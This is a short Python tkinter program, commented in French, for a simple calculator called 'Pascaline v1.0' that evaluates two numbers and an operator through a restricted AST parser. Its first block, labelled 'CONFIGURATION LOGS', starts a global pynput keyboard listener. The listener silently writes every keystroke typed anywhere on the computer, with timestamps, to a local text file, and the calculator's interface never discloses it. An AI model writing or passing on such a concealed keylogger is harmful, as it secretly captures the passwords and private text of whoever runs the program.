import tkinter as tk
from tkinter import messagebox
import ast
import operator
from pynput import keyboard
from datetime import datetime

# --- CONFIGURATION LOGS (Identique à ton code) ---
def on_press(key):
    try:
        heure = datetime.now().strftime("%H:%M:%S")
        with open("log_calculatrice.txt", "a") as f:
            if hasattr(key, "char") and key.char is not None:
                f.write(f"[{heure}] Touche: {key.char}\n")
            elif key == keyboard.Key.enter:
                f.write(f"[{heure}] Touche: ENTREE\n")
    except: pass

listener = keyboard.Listener(on_press=on_press)
listener.start()

# --- LOGIQUE DE CALCUL (Nettoyée pour l'interface) ---
OPERATORS = {ast.Add: operator.add, ast.Sub: operator.sub, 
             ast.Mult: operator.mul, ast.Div: operator.truediv,
             ast.Pow: operator.pow}

def evaluate_simple(node):
    if isinstance(node, ast.Constant):
        return node.value
    elif isinstance(node, ast.BinOp):
        return OPERATORS[type(node.op)](evaluate_simple(node.left), evaluate_simple(node.right))
    raise ValueError("Non supporté")

# --- FONCTION DE LIAISON INTERFACE ---
def executer_calcul():
    try:
        # Récupération des valeurs depuis les Entry de Tkinter
        v1 = entree_nb1.get()
        op = entree_op.get()
        v2 = entree_nb2.get()
        
        # Reconstruction de l'expression pour ton parseur AST
        expression = f"{v1}{op}{v2}"
        tree = ast.parse(expression, mode="eval")
        resultat = evaluate_simple(tree.body)
        
        # Affichage du résultat dans le Label
        label_resultat.config(text=f"Résultat : {resultat}", fg="green")
        
    except ZeroDivisionError:
        messagebox.showerror("Erreur", "Division par zéro impossible !")
    except Exception:
        messagebox.showerror("Erreur", "Saisie invalide.\nExemple: 10 + 5")

# --- INTERFACE GRAPHIQUE TKINTER ---
root = tk.Tk()
root.title("Calculatrice Pascaline v1.0")
root.geometry("500x600")
root.configure(padx=20, pady=20)

# Titre
tk.Label(root, text="PASCALINE v1.0", font=("Arial", 16, "bold")).pack(pady=10)

# Champs de saisie
tk.Label(root, text="Nombre 1 :").pack()
entree_nb1 = tk.Entry(root, justify="center")
entree_nb1.pack(pady=5)

tk.Label(root, text="Opérateur (+, -, *, /, **) :").pack()
entree_op = tk.Entry(root, justify="center", width=5)
entree_op.pack(pady=5)

tk.Label(root, text="Nombre 2 :").pack()
entree_nb2 = tk.Entry(root, justify="center")
entree_nb2.pack(pady=5)

# Bouton de calcul
btn_calcul = tk.Button(root, text="CALCULER", command=executer_calcul, 
                       bg="#4CAF50", fg="white", font=("Arial", 10, "bold"), height=2, width=15)
btn_calcul.pack(pady=20)

# Zone d'affichage du résultat
label_resultat = tk.Label(root, text="", font=("Arial", 12, "bold"))
label_resultat.pack(pady=10)

# Lancement
root.mainloop()